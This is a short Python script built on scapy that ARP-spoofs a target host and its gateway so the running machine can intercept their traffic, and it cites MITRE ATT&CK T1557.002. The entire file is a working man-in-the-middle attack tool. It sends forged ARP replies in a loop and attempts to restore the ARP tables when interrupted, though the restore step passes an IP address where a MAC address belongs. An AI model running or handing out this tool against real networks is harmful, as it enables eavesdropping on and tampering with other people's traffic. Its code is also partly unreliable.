#!/usr/bin/env python3
# Python3 script for ARP Spoofing a targeted IP or local network
# Reference https://attack.mitre.org/techniques/T1557/002/ for more information on ARP Poisoning and threat actor groups leveraging this technique
# Requires root/admin privileges on the device

#imports
import scapy.all as scapy
import time
import optparse

#Get the user arguments for the target IP and gateway address
def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target IP address to ARP poision")
    parser.add_option("-g", "--gateway", dest="gateway", help="Gateway IP address")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target. Use --help for more info.")
    elif not options.gateway:
        parser.error("[-] Please specify the gateways IP address. Use --help for more info.")
    return options

#Get the MAC address for a specified IP address
def get_mac(ip):
    #Create ARP packet
    arp_request = scapy.ARP(pdst=ip)
    #Create an Ethernet object and set the destination to all hosts on the local network
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    #Combine the broadcast and ARP request packets
    arp_request_broadcast = broadcast/arp_request
    #Send packets with a custom Ether part. Returns two lists answered and unanswered
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

#Spoof a specified target IP and the gateway
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    #Construct the packet
    ##op=2 specifies an ARP Response
    ##pdst sets the destinations IP/our target
    ##hwdst sets the hardware address of our target
    ##psrc sets the source IP of the router
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    #Send the packet
    scapy.send(packet, verbose=False)

#Restore the ARP table
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    #hwsrc is the source MAC. Defaults to our host unless specified
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_ip, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

#Get the options and set them to target_ip and gateway_ip
options = get_arguments()
target_ip = options.target
gateway_ip = options.gateway

#Track the number of sent packets
sent_packets_count = 0
try:
    #ARP Poison the target
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent:", sent_packets_count, end="")
        time.sleep(2)
except KeyboardInterrupt:
    restore(target_ip, gateway_ip)
    print("[-] Program stopped by user. ARP tables restored")